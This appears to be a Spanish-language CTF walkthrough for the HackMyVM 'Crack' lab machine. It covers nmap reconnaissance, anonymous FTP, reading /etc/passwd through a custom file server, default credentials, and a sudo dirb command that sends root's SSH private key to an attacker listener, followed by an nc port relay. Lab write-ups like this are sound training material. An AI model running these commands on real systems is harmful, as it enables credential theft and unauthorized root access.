---
layout: post
title: "Write Up Crack. "
subtitle: "eJPTv2 Track "
category: Blog
tags: [Easy,Genin,Linux,HMVM,Reverse-Shell,PHP,FTP,SUDO,Weak-Credentials,Reconnaissance,Protocols,eJPTv2]
image:
  path: /assets/img/crack/crack.png
---

***

<!--more-->

1. this ordered seed list will be replaced by the toc
{:toc}

***

## Reconnaissance


### Ping Sweep


```bash
sudo arp-scan -I ens33 --localnet
```

![list](/assets/img/crack/1.png){:.lead width="800" height="100" loading="lazy"}


### Nmap


```bash
nmap --open -p- -Pn -n -T4 -vvv -n 198.168.1.41 -oN allports
```


![list](/assets/img/crack/2.png){:.lead width="800" height="100" loading="lazy"}



### Services and Versions


```bash
nmap -sVC -Pn -n -p21,4200,12359 198.168.1.41 -oN target
```

![list](/assets/img/crack/3.png){:.lead width="800" height="100" loading="lazy"}


***

## Vulnerability Analysis and Expltation


### FTP TCP-21


Como podemos conectarnos como el usuario **anonymous** sin credenciales porque losotros puerto parecen un poco extraños primero enpezamos, adentro del servicio hay una utilidad en python que tal parece ser un **crack.py** que esta dentro de la carpeta **/upload/**.



![list](/assets/img/crack/4.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Descargamos el **crack.py**.


En resumen, este código implementa un servidor que acepta conexiones entrantes y permite a un cliente solicitar la lectura de un archivo pero extre crack.py por lo que vemos se ejecuta en elpuerto 12359, si el archivo existe, se envían las líneas del archivo al cliente. Si el archivo no existe, se envía la respuesta "NO", pues  con esto en mete creamos un archivo llmado **passwd** y lo subimos a **FTP**.


![list](/assets/img/crack/5.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Subimos el **passwd**.


![list](/assets/img/crack/6.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Con esto leemos el **/etc/passwd** del uasuario **cris** aparentemente.


![list](/assets/img/crack/7.png){:.lead width="800" height="100" loading="lazy"}


### HTTP TCP-4200


Con nmap, vimos que hay un puerto **4200** en el que se encuentra alojado un servidor web que proporciona una terminal **shell in a box**. Vamos a explorar esta terminal, y como es normal nesesitamos credenciales y solo tenemos el usuario cris y como ya sabemos debemosprobar contraseñas por defecto  asi que la clave es **cris** tambien.


![list](/assets/img/crack/8.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Ya podemos  ver la la flag en su escritoriopero nos vamos a mandar una reverse shell para movernos mejor.


![list](/assets/img/crack/10.png){:.lead width="800" height="100" loading="lazy"}


***

## Escalation Privileges


Primero, ejecutamos el comando **id** en Linux para obtener información sobre la identificación del usuario actual y los grupos a los que pertenece, ademas ejecutaremos **uname -a** y **lsb_release -a** para obtener información del sistema, verificaremossi otro usurio tiene permisos sudores con **sudo -l**, además, buscamos binarios con permisos **SUID** y tareas **Cron** en busca de posibles puntos de entrada. 


Si no encontramos resultados significativos con las acciones anteriores, procedemos a subir los binarios **linpeas** y **pspy** .etc, al sistema. Estos binarios nos ayudarán a realizar un análisis de reconocimiento más exhaustivo, identificando posibles vulnerabilidades o actividades sospechosas en el sistema.


También realizamos un análisis manual del sistema, buscando configuraciones inseguras, archivos sensibles o cualquier otra anomalía que pueda indicar una posible vulnerabilidad o actividad maliciosa.


Sudo -l nos dice que cualquier usuario puede ejecutar el comando **/usr/bin/dirb** pero buscando no nos podemos aprovecahr de dirb para escalar privileguos sin proporcionar una contraseña pero no hay nada en internet sobre como escalar privileguios con eso asi que debemos buscar otra forma.


![list](/assets/img/crack/9.png){:.lead width="800" height="100" loading="lazy"}


La forma es que debemos ponernos a la escucha con un servidor con python y luego ejecutar lo siguiente:


```bash
sudo /usr/bin/dirb http://192.168.1.34 /root/.ssh/id_rsa
```

{:.note}
Esto nod dara la idrsa de root que debemos tratar de filtrar con `cat id_rsa | awk '{print $2}' FS="GET" | awk '{print $1}' FS=" HTTP" | sed 's/\//\'$'\n\/' | sed '/^\s*$/d' > root.id_rsa` para quedarnos con la **id_rsa** integra de root.


![list](/assets/img/crack/13.png){:.lead width="800" height="100" loading="lazy"}


![list](/assets/img/crack/15.png){:.lead width="800" height="100" loading="lazy"}



{:.note}
Le damos permisos 600 y nos conectamos por ssh a root internamente o podemos hacer `nc -nlktp 9999 -c "nc 127.0.0.1 22"` externamente y ya es cuestion de buscar la flag en su directorio, el de root.


***

```bash
🎉 Felicitaciones ya has comprometido Crack de Hack My VM 🎉
```
{:.centered}

***

Back to [Certification eJPTv2 ](2023-06-02-Road-to-eJPTv2.md){:.heading.flip-title}
{:.read-more}
